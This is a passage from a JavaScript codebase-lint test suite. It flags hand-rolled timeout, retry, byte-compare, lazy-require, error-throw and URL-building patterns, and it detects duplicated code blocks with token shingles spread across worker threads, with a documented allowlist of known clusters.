      var window = lines.slice(li, Math.min(li + 6, lines.length)).join("\n");
      var assignRe = new RegExp("\\b" + name + "\\s*=\\s*setTimeout\\s*\\(");
      if (assignRe.test(window)) {
        bad.push({
          file: rel,
          line: li + 1,
          content: lines[li].trim(),
        });
        break;
      }
    }
  }
  bad = _filterMarkers(bad, "handrolled-debounce");
  _report("hand-rolled clearTimeout/setTimeout debounce → use " +
          "safeAsync.debounce (timer lifecycle owned)",
    bad);
}

// ---- Pattern 35: hand-rolled Promise.race timeout ----

function testNoHandrolledPromiseRaceTimeout() {
  // class: handrolled-race-timeout
  // `Promise.race([fn(), new Promise((r) => setTimeout(...))])` is the
  // timeout-with-cancel idiom. Should use `b.safeAsync.withTimeout(fn,
  // ms)` which handles abort + leaked-timer cleanup.
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    if (rel === "lib/safe-async.js") continue;
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length; li++) {
      if (!/\bPromise\.race\s*\(/.test(lines[li])) continue;
      var window = lines.slice(li, Math.min(li + 8, lines.length)).join("\n");
      if (/\bsetTimeout\s*\(/.test(window)) {
        bad.push({
          file: rel,
          line: li + 1,
          content: lines[li].trim(),
        });
        break;
      }
    }
  }
  bad = _filterMarkers(bad, "handrolled-race-timeout");
  _report("Promise.race + setTimeout timeout → use safeAsync.withTimeout",
    bad);
}

// ---- Pattern 36: manual byte-by-byte compare ----

function testNoManualByteCompare() {
  // class: manual-byte-compare
  // Hand-rolled `for (var i = 0; i < a.length; i++) if (a[i] !== b[i])`
  // is a constant-time-WRONG comparison. Anything comparing crypto
  // material must use `b.crypto.timingSafeEqual` (length-tolerant +
  // node:crypto under the hood).
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    if (rel === "lib/crypto.js") continue;
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length - 2; li++) {
      // for (var i = 0; i < a.length; i++) {  if (a[i] !== b[i])
      var loop = /for\s*\(\s*var\s+\w+\s*=\s*0\s*;\s*\w+\s*<\s*(\w+)\.length\s*;\s*\w+\+\+\s*\)/.exec(lines[li]);
      if (!loop) continue;
      var window = lines.slice(li, Math.min(li + 4, lines.length)).join("\n");
      if (/\[\s*\w+\s*\]\s*!==?\s*\w+\s*\[\s*\w+\s*\]/.test(window)) {
        bad.push({
          file: rel,
          line: li + 1,
          content: lines[li].trim(),
        });
        break;
      }
    }
  }
  bad = _filterMarkers(bad, "manual-byte-compare");
  _report("manual byte-by-byte compare loop → use crypto.timingSafeEqual",
    bad);
}

// ---- Pattern 37: lazy-require pattern open-coded ----

function testNoOpenCodedLazyRequire() {
  // class: open-coded-lazy-require
  // The shape `var _x = null; function x() { if (!_x) _x = require("./y"); return _x; }`
  // pre-dates lib/lazy-require. Any new occurrence should use
  // `lazyRequire(function () { return require("./y"); })` so test-reset
  // (.reset()) and cycle-break behavior is consistent.
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    if (rel === "lib/lazy-require.js") continue;
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    if (!/\bvar\s+_\w+\s*=\s*null\s*;/.test(content)) continue;
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length - 2; li++) {
      var m = /\bvar\s+(_\w+)\s*=\s*null\s*;/.exec(lines[li]);
      if (!m) continue;
      var name = m[1];
      var window = lines.slice(li, Math.min(li + 6, lines.length)).join("\n");
      var loadRe = new RegExp("if\\s*\\(\\s*!" + name + "\\s*\\)\\s*" + name +
                              "\\s*=\\s*require\\(");
      if (loadRe.test(window)) {
        bad.push({
          file: rel,
          line: li + 1,
          content: lines[li].trim(),
        });
        break;
      }
    }
  }
  bad = _filterMarkers(bad, "open-coded-lazy-require");
  _report("open-coded lazy-require pattern → use lib/lazy-require",
    bad);
}

// ---- Pattern 38: throw new Error(string) instead of framework error ----

function testNoBareErrorThrows() {
  // class: bare-error-throw
  // `throw new Error("...")` skips the framework's .code dispatch.
  // Only flag files that ALREADY have a `defineClass`-built error class —
  // those throws are inconsistent with the file's own contract. Files
  // without a defined class are typically helpers (constants validators,
  // small leaf modules) where plain Error is acceptable.
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    if (rel === "lib/constants.js" || rel === "lib/framework-error.js") continue;
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    // Skip files that don't define their own error class — plain Error
    // is the contract for those.
    if (!/\bdefineClass\s*\(\s*["']\w+Error/.test(content)) continue;
    var lines = content.split(/\r?\n/);
    var fileHits = 0;
    for (var li = 0; li < lines.length; li++) {
      var line = lines[li];
      if (/^\s*(\/\/|\*|\/\*)/.test(line)) continue;
      if (!/\bthrow\s+new\s+Error\s*\(/.test(line)) continue;
      bad.push({
        file: rel,
        line: li + 1,
        content: line.trim(),
      });
      fileHits++;
      if (fileHits >= 2) break;   // sample 2 per file
    }
  }
  bad = _filterMarkers(bad, "bare-error-throw");
  _report("throw new Error(string) in a file with its own FrameworkError " +
          "class → use that class with a .code",
    bad);
}

// ---- Pattern 39: hand-rolled URL building ----

function testNoHandrolledUrlBuild() {
  // class: handrolled-url-build
  // String-concat URL building (`endpoint + "/" + path`) sidesteps
  // safeUrl.parse's protocol allowlist + length cap + userinfo guard.
  // Lines that pass the concatenated string straight into safeUrl.parse
  // or a project-specific wrapper (`_internalUrl`) are routed correctly
  // and exempt; bare returns / assignments are the bypass.
  var matches = _scan(/(["'])\s*\+\s*\w*[Ee]ndpoint\b|\b\w*[Ee]ndpoint\s*\+\s*["']\//);
  matches = matches.filter(function (m) {
    // Skip when the concat is wrapped in safeUrl.parse / _internalUrl.
    return !/\b(safeUrl\.parse|_internalUrl)\s*\(/.test(m.content);
  });
  matches = _filterMarkers(matches, "handrolled-url-build");
  _report("string-concat URL build → use safeUrl.parse (or document " +
          "the internal-trusted exception)",
    matches);
}

// ---- Pattern 40: hand-rolled retry loop ----

function testNoHandrolledRetryLoop() {
  // class: handrolled-retry-loop
  // `for (var attempt = 0; attempt < N; attempt++)` with `setTimeout`
  // inside is the retry-with-backoff idiom. Should use `b.retry`
  // (handles isPermanent classification, jitter, max-elapsed-time cap,
  // observability events).
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    if (rel === "lib/retry.js") continue;
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length - 5; li++) {
      // for (var <attempt-ish> = 0; ... < <max-attempts-ish>; ...)
      var m = /for\s*\(\s*var\s+(attempt|tries|retr\w*)\s*=/i.exec(lines[li]);
      if (!m) continue;
      var window = lines.slice(li, Math.min(li + 12, lines.length)).join("\n");
      if (/\bsetTimeout\s*\(/.test(window)) {
        bad.push({
          file: rel,
          line: li + 1,
          content: lines[li].trim(),
        });
        break;
      }
    }
  }
  bad = _filterMarkers(bad, "handrolled-retry-loop");
  _report("for-loop + setTimeout retry pattern → use b.retry",
    bad);
}

// ---- Pattern 41: duplicate code blocks (look-alike windows) ----

// Normalize a JS source line so logically-identical code shapes hash
// the same. The transform strips identifiers (keeping keywords),
// string / number / regex literals, and whitespace. Two functions that
// differ only in variable / file names produce the same fingerprint.
var _JS_KEYWORDS = new Set([
  "var", "let", "const", "function", "return", "if", "else", "for",
  "while", "do", "switch", "case", "default", "break", "continue",
  "try", "catch", "finally", "throw", "new", "this", "null", "undefined",
  "true", "false", "typeof", "instanceof", "in", "of", "delete", "void",
  "async", "await", "class", "extends", "super", "import", "export",
  "from", "as", "with", "yield", "static",
  // Node CommonJS module globals — kept verbatim so require-block
  // duplication can be detected as boilerplate (see _isBoilerplate).
  "require", "module", "exports", "Buffer", "process", "console",
  "Promise", "Object", "Array", "String", "Number", "Boolean", "Date",
  "RegExp", "Error", "Math", "JSON", "Symbol", "Map", "Set", "WeakMap",
  "WeakSet", "Reflect", "Proxy",
]);

function _normalizeJsLine(line) {
  // Strip line comments
  line = line.replace(/\/\/.*$/, "");
  // Replace string literals
  line = line.replace(/"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'|`(?:[^`\\]|\\.)*`/g, "_STR");
  // Replace regex literals (regex-context heuristic; same shape as
  // testNoDuplicateRegexAcrossFiles).
  line = line.replace(/(^|[=(,?:[;!&|]|\breturn\s|\bthrow\s|=>\s*)\/((?:\\.|[^/\\\n])+)\/[gimsuy]*/g,
                      "$1_RE");
  // Replace number literals (decimal + hex).
  line = line.replace(/\b\d+(?:\.\d+)?(?:[eE][+-]?\d+)?\b|0x[0-9a-fA-F]+/g, "_NUM");
  // Replace identifiers with _ID, keeping reserved words AND the
  // placeholder tokens emitted earlier (`_STR` / `_NUM` / `_RE` —
  // these match the identifier regex but must survive this pass).
  line = line.replace(/\b[a-zA-Z_$][a-zA-Z0-9_$]*\b/g, function (name) {
    if (name === "_STR" || name === "_NUM" || name === "_RE") return name;
    return _JS_KEYWORDS.has(name) ? name : "_ID";
  });
  // Insert whitespace around operators / brackets / punctuation so the
  // shingle tokenizer (split on whitespace) sees one token per logical
  // language token. Without this, `require(_STR);` would tokenize as a
  // single opaque token instead of five, and `module.exports` would
  // tokenize as one rather than three.
  line = line.replace(/([.(){}[\];,:?!&|^~<>=+\-*/%@])/g, " $1 ");
  // Collapse whitespace.
  line = line.replace(/\s+/g, " ").trim();
  return line;
}

async function testNoDuplicateCodeBlocks() {
  // class: duplicate-block
  // Token-n-gram shingle detection. Each .js file is fully tokenized
  // (with identifiers/strings/numbers/regexes normalized to placeholders),
  // then split into overlapping N-token shingles. Each shingle that
  // appears in 3+ distinct files is a "shared logic shape" — the kind
  // of repeated try/catch, validation cascade, or request-init pattern
  // that should be a shared primitive.
  //
  // Why n-gram shingles instead of fixed-line windows: line layout
  // varies (a 1-line check in one file can be a 3-line if-block in
  // another, identical logic). Token-level shingles match the SHAPE
  // regardless of line breaks. Multiple shingle sizes are scanned so
  // both narrow primitives (6 tokens ≈ "if-then-throw") and wider
  // chains (16 tokens ≈ "validate-then-emit-then-return") surface.
  //
  // Tuning:
  //   SHINGLE_SIZES — token-window sizes scanned. Smaller catches
  //     finer-grain idiom (3-call chains); larger catches whole
  //     function bodies. Multi-pass produces both.
  //   MIN_DISTINCT_FILES — min files for a shingle to enter the
  //     advisory inventory (2+). The hard-fail gate is the separate
  //     STRONG_MIN_FILES = 3 (a shape in 3+ files fails the build).
  //   MIN_DISTINCT_TOKENS — skip shingles whose tokens are mostly
  //     punctuation / repeated closer chars.
  //   MAX_REPORTED_PER_LENGTH — cap to keep the report scannable;
  //     biggest-N hits are surfaced first because they represent the
  //     largest primitive opportunities.
  var SHINGLE_SIZES = [60, 50, 40, 30, 22, 16, 12, 8];
  var MIN_DISTINCT_FILES = 2;          // 2+ files → advisory inventory (STRONG_MIN_FILES = 3 hard-fails)
  var MIN_DISTINCT_TOKENS = 5;
  var _MAX_REPORTED_PER_LENGTH = 5000;

  var files = _libFiles();
  var REPO_ROOT_LOCAL = path.resolve(__dirname, "..", "..");
  var WORKER_PATH = path.join(__dirname, "..", "helpers", "_codebase-shingle-worker.js");
  var SHINGLE_OPTS_FOR_WORKER = {
    shingleSizes:      SHINGLE_SIZES,
    minDistinctTokens: MIN_DISTINCT_TOKENS,
    repoRoot:          REPO_ROOT_LOCAL,
  };

  // Two-pass scan (exact + skeleton fingerprints) runs inside worker
  // threads — see test/helpers/_codebase-shingle.js. Each shard
  // returns a per-pass-per-size fingerprint map; the main thread
  // merges them and runs the cluster-aggregation logic below.


  // ---- Enclosing-function index ----
  //
  // Each duplicate site carries a (file, line) pair; the matcher now
  // wants (file, fn) tuples so allowlist entries can gate by
  // file+function instead of by file alone. The index is built lazily
  // per-file by walking line-by-line for `function NAME (`,
  // `var NAME = function (`, `exports.NAME = function (`, and the
  // `NAME (...) {` method-shorthand shape. The most-recent declaration
  // before the site's first line is the enclosing fn — nested
  // functions resolve to the innermost match. Sites that fall before
  // any function declaration belong to `<top>` (module-level).
  var _fnIndexByFile = Object.create(null);
  // Recognized declaration shapes — the four forms primitives in this
  // codebase use to declare top-of-file or factory-internal helpers.
  // Anonymous function expressions inside object literals (short
  // method form) are intentionally NOT recognized — they cluster as
  // their enclosing var/function.
  var _FN_DECL_PATTERNS = [
    /^\s*(?:async\s+)?function\s+([A-Za-z_$][A-Za-z0-9_$]*)\s*\(/,                                // function NAME (
    /^\s*var\s+([A-Za-z_$][A-Za-z0-9_$]*)\s*=\s*(?:async\s+)?function\s*\(/,                      // var NAME = function (
    /^\s*(?:exports|module\.exports)\.([A-Za-z_$][A-Za-z0-9_$]*)\s*=\s*(?:async\s+)?function\s*\(/, // exports.NAME = function (
  ];
  function _buildFnIndex(rel) {
    var abs = path.resolve(__dirname, "..", "..", rel);
    var content;
    try { content = fs.readFileSync(abs, "utf8"); }
    catch (_e) { return [{ startLine: 1, name: "<top>" }]; }
    var lines = content.split(/\r?\n/);
    var fns = [{ startLine: 1, name: "<top>" }];
    for (var li = 0; li < lines.length; li++) {
      var L = lines[li];
      var m = null;
      for (var pi = 0; pi < _FN_DECL_PATTERNS.length; pi += 1) {
        m = L.match(_FN_DECL_PATTERNS[pi]);
        if (m) break;
      }
      if (!m) continue;
      fns.push({ startLine: li + 1, name: m[1] });
    }
    return fns;
  }
  function _enclosingFn(rel, line) {
    if (!_fnIndexByFile[rel]) _fnIndexByFile[rel] = _buildFnIndex(rel);
    var fns = _fnIndexByFile[rel];
    var best = fns[0];
    for (var i = 0; i < fns.length; i++) {
      if (fns[i].startLine <= line) best = fns[i];
      else break;
    }
    return best.name;
  }

  // Per-(file-set, file-region) cluster: one report per UNIQUE
  // primitive-extraction opportunity. A duplicate run that spans 30
  // overlapping 40-token shingles in the same file-set collapses to
  // one entry (the LARGEST shingle observed, since it bounds the
  // duplicated region best).
  //
  // The cluster key is the sorted file-set joined by `|`. Two
  // shingles that match the same file-set but at different line
  // ranges are different "instances" of the same conceptual pattern
  // — kept as separate entries so each call site is reported.
  var clusters = {};   // fileSetKey → { fileSet, bestSize, bestPass, sites: [{file, startLine, endLine, size}] }

  // Fan files across worker_threads. Each worker tokenizes its shard
  // and runs the shingle scan, returning a per-pass-per-size
  // fingerprint map. Main thread merges shard maps (per (pass, size,
  // fp) key, append site lists) then runs the cluster-aggregation
  // identical to the previous single-thread version. With 32 cores,
  // ~250 files split into ~8-file shards: the cross-thread overhead
  // is tiny vs the savings on the 60-token × 250-file × 8-size scan.
  //
  // Knobs: HS_PATTERNS_WORKERS=N overrides the worker count;
  // HS_PATTERNS_NO_THREADS=1 forces in-process execution (debug /
  // single-core CI).
  var Worker = require("worker_threads").Worker;
  var os     = require("os");
  function _scanShardInWorker(shardFiles) {
    return new Promise(function (resolve, reject) {
      var w = new Worker(WORKER_PATH, {
        workerData: Object.assign({ files: shardFiles }, SHINGLE_OPTS_FOR_WORKER),
      });
      // Reap the worker on EVERY settle path (#123). Previously the error and
      // exit handlers rejected without terminate(), so an errored worker thread
      // stayed alive holding its event-loop handles — the parent could not exit
      // and the smoke run ran to the 25-min watchdog on memory-starved
      // macOS-arm64 runners. settle() terminates first, idempotently.
      var settled = false;
      function settle(fn, arg) {
        if (settled) return;
        settled = true;
        try { w.terminate(); } catch (_e) { /* already terminating */ }
        fn(arg);
      }
      w.once("message", function (msg) { settle(resolve, msg); });
      w.once("error", function (e) { settle(reject, e); });
      w.once("exit", function (code) {
        if (code !== 0 && code !== null) settle(reject, new Error("shingle worker exited " + code));
      });
    });
  }
  // Cap worker fan-out at 4 — each Worker holds the per-shard
  // fingerprint map in heap until message-resolve; on macOS-arm64
  // CI runners (2 GB Node default heap) ~250 files × 8 cores
  // peaked above the heap-limit and OOMed the smoke run. 4 workers
  // keeps the parallel speedup (5x faster than single-threaded)
  // without crossing the memory ceiling on slow runners. Operators
  // with bigger machines override via HS_PATTERNS_WORKERS=N.
  var WORKER_CAP = 4;                                                                          // allow:raw-byte-literal — worker fan-out cap, not bytes
  var workerCount = Number(process.env.HS_PATTERNS_WORKERS) ||
                    Math.min(os.cpus().length, Math.max(1, files.length), WORKER_CAP);
  var shardResults;
  if (process.env.HS_PATTERNS_NO_THREADS === "1" || workerCount <= 1) {
    var shingleScan = require(path.join(__dirname, "..", "helpers", "_codebase-shingle"));
    shardResults = [shingleScan.scanShard(files, SHINGLE_OPTS_FOR_WORKER)];
  } else {
    var shards = [];
    for (var sIdx = 0; sIdx < workerCount; sIdx += 1) shards.push([]);
    for (var fIdx = 0; fIdx < files.length; fIdx += 1) {
      shards[fIdx % workerCount].push(files[fIdx]);
    }
    shards = shards.filter(function (s) { return s.length > 0; });
    shardResults = await Promise.all(shards.map(_scanShardInWorker));
  }

  // Merge shard outputs into a single per-(pass, size) seen map, then
  // run the existing cluster-aggregation. Identical semantics to the
  // pre-parallel version — workers only handle the per-shard fp
  // generation, never the cluster identity decision.
  var seenByPassSize = { "[exact]": {}, "[skeleton]": {} };
  shardResults.forEach(function (shardOut) {
    ["exact", "skeleton"].forEach(function (passKey) {
      var label = passKey === "exact" ? "[exact]" : "[skeleton]";
      var perSize = shardOut[passKey] || {};
      Object.keys(perSize).forEach(function (sizeStr) {
        if (!seenByPassSize[label][sizeStr]) seenByPassSize[label][sizeStr] = {};
        var dest = seenByPassSize[label][sizeStr];
        var src  = perSize[sizeStr];
        Object.keys(src).forEach(function (fp) {
          if (!dest[fp]) dest[fp] = src[fp];
          else dest[fp] = dest[fp].concat(src[fp]);
        });
      });
    });
  });

  // Iterate sizes largest-first so cluster.sites end up holding the
  // bestSize occurrences in a single pass. Within a size, sort the
  // fingerprints lexically so cluster identity (which fp's
  // occurrences populate `sites` when multiple fps map to the same
  // fileSet+size) is invariant under shard-merge order — without
  // this, parallel runs diverge from in-process runs because shards
  // contribute fps in different orders.
  var sortedSizes = Object.keys(seenByPassSize["[exact]"] || {}).map(Number).sort(function (a, b) { return b - a; });
  Object.keys(seenByPassSize).forEach(function (passLabel) {
    var perSize = seenByPassSize[passLabel];
    for (var szi = 0; szi < sortedSizes.length; szi += 1) {
      var n = sortedSizes[szi];
      var seen = perSize[String(n)];
      if (!seen) continue;
      var fps = Object.keys(seen).sort();
      for (var fpi = 0; fpi < fps.length; fpi += 1) {
        var fp = fps[fpi];
        var occ = seen[fp];
        var distinctFiles = {};
        occ.forEach(function (o) { distinctFiles[o.file] = true; });
        var fileList = Object.keys(distinctFiles).sort();
        if (fileList.length < MIN_DISTINCT_FILES) continue;
        var key = passLabel + "|" + fileList.join("|");
        if (!clusters[key]) {
          clusters[key] = {
            fileSet:   fileList,
            passLabel: passLabel,
            bestSize:  n,
            sites:     occ.slice(),
          };
        } else if (n > clusters[key].bestSize) {
          clusters[key].bestSize = n;
          clusters[key].sites = occ.slice();
        }
      }
    }
  });

  // Convert clusters to sorted report rows. Bigger shingles + larger
  // file-sets are stronger primitive opportunities — surface first.
  var rows = Object.keys(clusters).map(function (k) { return clusters[k]; });
  rows.sort(function (a, b) {
    if (b.fileSet.length !== a.fileSet.length) return b.fileSet.length - a.fileSet.length;
    return b.bestSize - a.bestSize;
  });

  // Strong-signal gating: clusters that hit BOTH the exact-pass AND
  // sufficient size + breadth are unambiguous primitive opportunities
  // (NOT control-flow noise or for-loop idiom). These fail the gate
  // hard. Smaller / skeleton-only clusters are tracked as advisory so
  // the inventory surfaces but doesn't block on language-idiom
  // matches.
  //
  // Threshold rationale: 50-token shingles span ~6-10 statements; any
  // 50-token sequence repeating in 10+ distinct files genuinely
  // represents a multi-statement code block that wants extraction —
  // NOT a stray for-loop or function-call shape that shows up in
  // every file by language convention.
  var STRONG_MIN_SIZE  = 50;
  var STRONG_MIN_FILES = 3;

  // KNOWN_CLUSTERS — per-cluster allowlist for the duplicate-block
  // detector. Each entry documents a cluster of files that share a
  // shape WHERE EXTRACTION IS BLOCKED OR INTENTIONAL: parser error
  // class signatures don't fit the framework's standard `(code, msg)`
  // contract; framework-convention shapes (chain verification loops,
  // multi-arg-format checks) are inherent to the domain; cross-domain
  // false-matches that share a 50-tok fingerprint by coincidence.
  //
  // Entry shape: every `files` element is `"path:fnName"` —
  // file-and-function qualified. The matcher pairs each duplicate
  // site's (file, line) against the enclosing function name and only
  // allowlists when both file AND function match an entry. New drift
  // landing in a different function of an already-listed file flags,
  // because a different function is a different extraction
  // opportunity.
  //
  // For module top-level code (rare — most duplicates are inside
  // factories/middleware bodies) use the literal token `<top>` as
  // the fn name.
  //
  // Bare `"path"` entries WITHOUT the `:fn` qualifier are rejected
  // at parse time — operators name the function they're allowlisting
  // so the audit trail records exactly which body of code shares the
  // shape.
  var KNOWN_CLUSTERS = [
    {
      // Delimited key/value split idiom — shape-only. The "split a string on a
      // separator, slice each piece at the first `=` into key + value" loop
      // recurs across unrelated parsers whose bodies diverge entirely: jmap's
      // URL-query splitter (_forEachQueryParam — `&`-separated, the caller
      // percent-decodes each slice it keeps), scim's _parseQuery (`&`-separated
      // with `+`→space form-decoding into a plain map), and guard-email's RFC
      // 5322 address-detection scan. The tokenized skeleton coincides; the
      // max byte-identical run across any pair is 1 line. The structured-field
      // kv-split (b.structuredFields.parseKeyValuePiece / forEachKeyValue) owns
      // the trim / lowercase / sf-unquote flavor; these URL-query and email
      // variants decode/branch differently and stay per-caller (a single
      // primitive would have to carry decode-mode + separator + container +
      // skip-empty as four axes for a one-line atom — not a real extraction).
      mode:  "family-subset",
      files: [
        "lib/guard-email.js:_detectAddressIssues",
        "lib/mail-server-jmap.js:_forEachQueryParam",
        "lib/middleware/scim-server.js:_parseQuery",
      ],
    },
    {
      // Opts-validation preamble — shape-only. The `<helper>(opts, ErrorClass,
      // "<ns>/bad-opts"); if (opts.<field> !== undefined && (typeof … !== "number"
      // || !isFinite … || <= 0 || Math.floor … !== …)) throw` validation opener
      // coincides across http-client's download/upload opts, queue-sqs's create,
      // and watcher's opts — each then validates an ENTIRELY different field set
      // (cross-pair byte-identical run = 0). http-client's two validators DO share
      // the same `opts.maxBytes` positive-int check (a within-file run=5 pair);
      // that is the documented focused-turn finding (http-client._requirePositiveInt
      // → numericBounds.requirePositiveFiniteIntIfPresent, pending the typed-error
      // adaptation — see the standing-order memory) and is within-file, not the
      // cross-3 shingle that makes this cluster fire.
      mode:  "family-subset",
      files: [
        "lib/http-client.js:_validateDownloadOpts",
        "lib/http-client.js:_validateUploadOpts",
        "lib/queue-sqs.js:create",
        "lib/watcher.js:_validateOpts",
      ],
    },
    {
      // JWS / signature-verify skeleton — shape-only. The "extract a signature,
      // assemble the signed bytes, call <alg>.verify, throw on failure" shape
      // recurs across fido-mds3's JWS verify (_verifyJws), jwt's compact-JWS
      // verify, and SAML's HTTP-Redirect SLO signature verify (parseLogout
      // Request / parseLogoutResponse) — three divergent signature schemes
      // (PQC / EdDSA JOSE JWS vs SAML redirect-binding query-sig) with their own
      // key shapes, error classes, and canonical-byte rules. The tokenized
      // verify skeleton coincides; max cross-pair byte-identical run = 1 line.
      // The prior JOSE pass (jwtExternal.algParams) deliberately kept the
      // verify-assembly per-caller (PQC/EdDSA/sign-vs-verify diverge); the one
      // genuine within-SAML signature-EXTRACTION pair is consolidated in
      // saml._extractRedirectSignature.
      mode:  "family-subset",
      files: [
        "lib/auth/fido-mds3.js:_verifyJws",
        "lib/auth/jwt.js:verify",
        "lib/auth/saml.js:parseLogoutRequest",
        "lib/auth/saml.js:parseLogoutResponse",
      ],
    },
    {
      // Entry-point input-validation preamble — genuinely shape-only.
      // Every public validator opens with the same two-check shape:
      //   if (!x || typeof x !== "object") throw new <DomainError>("<ns>/bad-input", "<msg>");
      //   if (typeof x.<field> !== "string" || x.<field>.length === 0) throw ...;
      // then diverges entirely into its own domain validation. The shared
      // structure is coincidental — each validator carries its OWN error
      // class, its OWN code namespace, and a domain-specific message that
      // names the actual field ("ctx required", "report: incidentId is
      // required", "traceparent required"). validateOpts.requireObject /
      // requireNonEmptyString cannot host these: requireObject hardcodes the
      // word "opts" ("opts must be an object") which is wrong for a data-input
      // argument, and requireNonEmptyString normalises the message to
      // "<label> must be a non-empty string, got <type>", dropping the field
      // name and the domain code. Routing would mold these validators, not
      // dedupe them; the duplication is structural only.
      mode:  "family-subset",
      files: [
        "lib/ai-disclosure.js:chatbot",
        "lib/auth/dpop.js:verify",
        "lib/auth/sd-jwt-vc-holder.js:store",
        "lib/compliance-sanctions.js:screen",
        "lib/dora.js:_validateReportInput",
        "lib/fda-21cfr11.js:_validateSignatureInput",
        "lib/guard-envelope.js:check",
        "lib/guard-list-unsubscribe.js:validate",
        "lib/guard-mail-query.js:validateActor",
        "lib/guard-mail-reply.js:validate",
        "lib/guard-saga-config.js:validate",
        "lib/guard-trace-context.js:validate",
        "lib/incident-report.js:open",
        "lib/mail-greylist.js:check",
        "lib/mail-helo.js:evaluate",
        // safe-buffer.js:makeByteCoercer — the config-time factory variant
        // of the same object-input + per-field-string preamble; its
        // SafeBufferError is message-first, so requireObject /
        // requireNonEmptyString would swap code/message. Inline, shape-only.
        "lib/safe-buffer.js:makeByteCoercer",
      ],
    },
    {
      // Guard module-top scaffolding — §9 convention, not extractable.
      // Every b.guard* module opens with the same mandated skeleton:
      //   var { defineClass } = require("./framework-error");
      //   var gateContract   = require("./gate-contract");  (+ guard-specific requires)
      //   var Guard<X>Error  = defineClass("Guard<X>Error", { alwaysPermanent: true });
      //   var DEFAULT_PROFILE = "strict";
      //   var PROFILES = Object.freeze({ strict: { ...
      // The error class is already built through the defineClass primitive,
      // the requires must stay at top-of-file (§9, cannot be hoisted into a
      // helper), and DEFAULT_PROFILE / the PROFILES table opening are the
      // standardised guard shape. The genuine module-top data dups that DID
      // hide here — the all-strict COMPLIANCE_POSTURES map, the strict-default
      // overlay, and the char-threat reject-all block — are already extracted
      // to gateContract.ALL_STRICT_POSTURES / strictDefaults /
      // CHAR_THREATS_REJECT_ALL and form their own (now-cleared) fingerprints,
      // so this residual <top> shingle is pure scaffolding.
      mode:  "family-subset",
      files: [
        "lib/guard-imap-command.js:<top>",
        "lib/guard-jmap.js:<top>",
        "lib/guard-list-id.js:<top>",
        "lib/guard-mail-compose.js:<top>",
        "lib/guard-mail-query.js:<top>",
        "lib/guard-mail-reply.js:<top>",
        "lib/guard-mail-sieve.js:<top>",
        "lib/guard-managesieve-command.js:<top>",
        "lib/guard-pop3-command.js:<top>",
        "lib/guard-posture-chain.js:<top>",
        "lib/guard-smtp-command.js:<top>",
        "lib/guard-stream-args.js:<top>",
        "lib/guard-mail-move.js:<top>",
        "lib/guard-saga-config.js:<top>",
        "lib/guard-snapshot-envelope.js:<top>",
        "lib/guard-tenant-id.js:<top>",
        "lib/guard-trace-context.js:<top>",
        "lib/guard-agent-registry.js:<top>",
        "lib/guard-archive.js:<top>",
        "lib/guard-cidr.js:<top>",
        "lib/guard-domain.js:<top>",
        "lib/guard-email.js:<top>",
        "lib/guard-event-bus-topic.js:<top>",
        "lib/guard-filename.js:<top>",
        "lib/guard-graphql.js:<top>",
        "lib/guard-html.js:<top>",
        "lib/guard-image.js:<top>",
        "lib/guard-json.js:<top>",
        "lib/guard-jsonpath.js:<top>",
        "lib/guard-jwt.js:<top>",
        "lib/guard-markdown.js:<top>",
        "lib/guard-mime.js:<top>",
        "lib/guard-oauth.js:<top>",
        "lib/guard-pdf.js:<top>",
        "lib/guard-regex.js:<top>",
        "lib/guard-shell.js:<top>",
        "lib/guard-sql.js:<top>",
        "lib/guard-svg.js:<top>",
        "lib/guard-template.js:<top>",
        "lib/guard-text.js:<top>",
        "lib/guard-time.js:<top>",
        "lib/guard-uuid.js:<top>",
        "lib/guard-xml.js:<top>",
        "lib/guard-yaml.js:<top>",
      ],
    },
    {
      // Per-guard PROFILES threat-policy tables — shape-only after the one
      // genuine invariant was extracted. The 12 identifier guards' strict /
      // balanced / permissive tiers share a STRUCTURE (a run of
      // `<axis>: "<disposition>"` policy lines, then `maxBytes` + `maxRuntimeMs`,
      // then the next tier) but the CONTENT is per-guard security config:
      // the threat axes diverge entirely (guard-domain ldhPolicy / punycodePolicy /
      // dgaPolicy / mixedScriptPolicy vs guard-cidr networkAlignmentPolicy /
      // reservedRangesPolicy vs guard-jwt's own set), and `maxBytes` is per-guard
      // (64 B … 512 KiB). The only byte-identical invariant — the four char-threat
      // axes all "reject" — is already extracted to gateContract.CHAR_THREATS_REJECT_ALL
      // (its own, now-cleared fingerprint). `maxRuntimeMs: C.TIME.seconds(2)` is
      // uniform today but a per-guard TUNABLE parse-runtime budget (a heavier guard
      // may legitimately raise it), not a security floor, so it stays per-guard.
      mode:  "family-subset",
      files: [
        "lib/guard-cidr.js:_ipv4ToUint32",
        "lib/guard-domain.js:_shannonEntropy",
        "lib/guard-graphql.js:<top>",
        "lib/guard-jsonpath.js:<top>",
        "lib/guard-jwt.js:_b64urlDecodeJson",
        "lib/guard-mime.js:<top>",
        "lib/guard-oauth.js:<top>",
        "lib/guard-regex.js:<top>",
        "lib/guard-shell.js:<top>",
        "lib/guard-template.js:<top>",
        "lib/guard-time.js:<top>",
        "lib/guard-uuid.js:<top>",
      ],
    },
    {
      // requireNonEmptyString idiom — shape-only. Every site opens a field
      // check with `if (typeof X !== "string" || X.length === 0) throw …
      // "must be a non-empty string"`, but the shared part is structural only:
      // each carries its OWN error class + code namespace and a domain-specific
